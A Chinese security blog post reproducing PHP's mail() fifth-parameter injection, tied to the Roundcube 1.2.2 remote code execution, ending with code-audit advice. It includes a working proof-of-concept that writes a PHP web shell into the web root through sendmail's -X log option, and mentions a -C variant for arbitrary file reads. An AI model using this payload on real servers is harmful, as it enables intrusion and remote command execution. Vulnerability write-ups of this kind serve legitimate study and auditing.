---
title: PHP's mail()远程代码执行
categories:
  - 代码执行
tags:
  - PHP函数漏洞
  - 邮件系统
toc: true 文章目录
author: BlBana
date: 2016-12-19 19:35:04
description:
comments:
original:
permalink:
---
## PHP's mail()远程代码执行

> 今天找到了一篇关于PHP mail函数代码执行漏洞的一篇文章，在本地复现了一下，在这里总结一下遇到的小坑。

<!-- more -->

### 0x01 漏洞简述
PHP中的mail()函数在一定的条件下可以造成远程代码执行漏洞，mail()函数一共具有5个参数，当第五个参数存在并且我们可控的时候，就会造成代码执行漏洞，这个漏洞最近被RIPS爆出了一个[command execution via email in Roundcube 1.2.2](https://blog.ripstech.com/2016/roundcube-command-execution-via-email/)，就是由于不正当的使用了mail()函数并且未对参数加以过滤造成的。

### 0x02 函数介绍
通过PHP的[官方文档](http://php.net/manual/zh/book.mail.php)，我们了解到mail()函数一共有五个参数：
1. To    **目的邮箱地址**
2. Subject   **邮箱的主题**
3. Message    **邮件的主题部分**
4. Headers    **头信息**
5. Parameters    **参数设置**

这里是第五个参数的详细介绍：
![Alt text](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Mail-exec/1.jpg)

这个参数主要的选项有：
1. -O option = value
QueueDirectory = queuedir **选择队列消息**

2. -X logfile
这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。

3. -f from email
这个参数可以让我们指定我们发送邮件的邮箱地址。

### 0x03 漏洞利用
现在我们尝试在本地复现出这个漏洞，注意事项：
> 1. 目标系统必须使用函数mail发送邮件，而不是使用SMTP的服务器；
> 2. mail函数需要配置实用sendmail系统来进行邮件的发送；
> 3. PHP配置中必须关闭safe_mode功能；
> 4. 必须知道目标服务器的Web根目录

**这里我遇到了一些小坑，主要是因为我是用的是Linux Kylin来复线的漏洞，本地没有默认安装sendmail系统，导致尝试了很多次没有效果，检查了目录权限等各种问题，最后发现需要具备sendmail系统才能正常利用漏洞，正如第二项写的那样，并且linux系统是默认有这个系统的**

漏洞代码：
```php
$to = 'a@b.c';
$subject = '<?php system($_GET["cmd"]); ?>';
$message = '';
$headers = '';
$options = '-OQueueDirectory=/tmp -X/var/www/html/rce.php';
mail($to, $subject, $message, $headers, $options);
```
我们指定好使用mail函数时的五个参数，在第二个参数中放入我们打算写入的内容，第五个参数中指定我们要写入的目录（**必须是PHP文件**）

我们搭建好基本的环境以后尝试运行上面的代码，发现在我们指定的目下产生了一个rce.php的文件。
![Alt text](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Mail-exec/2.jpg)

里面有我们发送邮件的一些信息，发现我们的恶意代码已经被植入了这个文件当中，这个时候我们直接利用浏览器对这个文件进行访问，触发漏洞：
![Alt text](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Mail-exec/3.jpg)

我们已经可以执行一些系统命令了。

---
对于这个漏洞我们还有第二种利用方法
第五个参数还有一个-C参数，可以用来指定备用的配置文件，这时我们对于错误的目录文件，就会导致程序报错被记录到我们的配置文件中，导致了任意文件读取漏洞：
![Alt text](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Mail-exec/4.jpg)

这个漏洞已经出现在了一款邮件系统上，[Roundcube 1.2.2 远程命令执行漏洞分析](http://paper.seebug.org/138/)，漏洞主要成因就是使用了mail函数发送邮件，并且没有对输入的参数加以过滤，导致了漏洞的产生，文中已经给出了详细的介绍。

### 0x04 总结
这个漏洞我们可以使用在代码审计当中（**当作一个危险函数**），在全局文件中搜索使用了mail函数已经它第五个参数的地方，回溯一下参数，看是否可控。

**参考链接：**
1. [官方手册](http://php.net/manual/zh/mail.configuration.php)
2. [Roundcube 1.2.2 远程命令执行漏洞分析](http://paper.seebug.org/138/)
3. [Roundcube 1.2.2: Command Execution via Email](https://blog.ripstech.com/2016/roundcube-command-execution-via-email/)


